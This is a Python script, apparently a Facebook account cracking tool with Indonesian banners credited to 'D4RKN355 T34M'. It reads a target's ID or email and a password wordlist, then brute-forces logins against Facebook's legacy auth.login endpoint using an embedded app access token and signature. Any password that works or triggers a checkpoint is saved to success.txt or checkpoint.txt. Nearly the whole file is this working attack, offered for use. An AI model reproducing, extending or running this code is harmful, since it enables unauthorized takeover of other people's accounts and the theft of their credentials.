import os, sys, time, datetime, random, json
from multiprocessing.pool import ThreadPool

try:
    import mechanize
except ImportError:
    os.system('pip install mechanize')

try:
    import requests
except ImportError:
    os.system('pip install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Cheking Acces\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m Seluruh grup \033[32;1m[\033[37;1mD4RKN355 T34M\033[32;1m]\n\033[35;1m------------------------------------------'


def ceknet():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(internet)
        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mChecking Internet Connection')
        time.sleep(2)
        
        toolbar_width = 25
        sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
        sys.stdout.flush()
        
        for i in range(toolbar_width):
            sys.stdout.write('\r')
            sys.stdout.flush()
            sys.stdout.write('\033[37;1m[')
            sys.stdout.write('\033[36;1m#\033[37;1m' * (i + 1))
            sys.stdout.flush()
            time.sleep(5.0 / 100)
            
        try:
            rq = requests.get('https://www.facebook.com', timeout=5)
            rq.raise_for_status()
            time.sleep(3.5)
            print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess')
            time.sleep(2.0)
            start()
        except (requests.RequestException, ConnectionError):
            time.sleep(3.5)
            print('\033[37;1m]\033[35;1m ~>\033[31;1m No Internet Connection')
            time.sleep(1.5)
            sys.exit(1)

    except KeyboardInterrupt:
        time.sleep(3.5)
        print('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mProgram stopped\n')
        sys.exit(0)

def start():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(banner)
        email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mPhone \033[31;1m: \033[32;1m')
        passw = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Wordlist File   \033[31;1m:\033[32;1m ')

        with open(passw, 'r') as f:
            total = f.readlines()
        
        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email)
        time.sleep(3.0)
        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total)))
        time.sleep(3.0)
        print()

        with open(passw, 'r') as sandi:
            for pw in sandi:
                try:
                    pw = pw.strip()
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    
                    response = requests.get(
                        'https://b-api.facebook.com/method/auth.login',
                        params={
                            'access_token': '237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1',
                            'format': 'json',
                            'sdk_version': '2',
                            'email': email,
                            'locale': 'en_US',
                            'password': pw,
                            'sdk': 'ios',
                            'generate_session_cookies': '1',
                            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
                        },
                        timeout=30
                    )
                    
                    mpsh = response.json()
                    
                    if 'access_token' in mpsh:
                        with open('success.txt', 'w') as dapat:
                            dapat.write(f'[ID]=> {email}\n[PW]=> {pw}')
                        print('\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND')
                        print(f'\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m{email}')
                        print(f'\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m {pw}')
                        print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                        print('\033[32;1m[=] \033[37;1mProgram Finished')
                        sys.exit(0)
                    
                    elif 'error_msg' in mpsh and 'www.facebook.com' in mpsh['error_msg']:
                        with open('checkpoint.txt', 'w') as ceks:
                            ceks.write(f'[ID]=> {email}\n[PW]=> {pw}')
                        print('\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND')
                        print(f'\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m{email}')
                        print(f'\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m {pw}')
                        print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHECKPOINT')
                        print('\033[33;1m[=] \033[37;1mProgram Finished')
                        sys.exit(0)
                        
                except requests.RequestException:
                    print('\n\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mConnection error')
                    sys.exit(1)
                except json.JSONDecodeError:
                    continue
                except KeyboardInterrupt:
                    print('\n\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mProgram stopped by user')
                    sys.exit(0)

    except IOError:
        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mWordlist file not found')
        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mPlease create your own wordlist')
        sys.exit(1)

if __name__ == '__main__':
    ceknet()
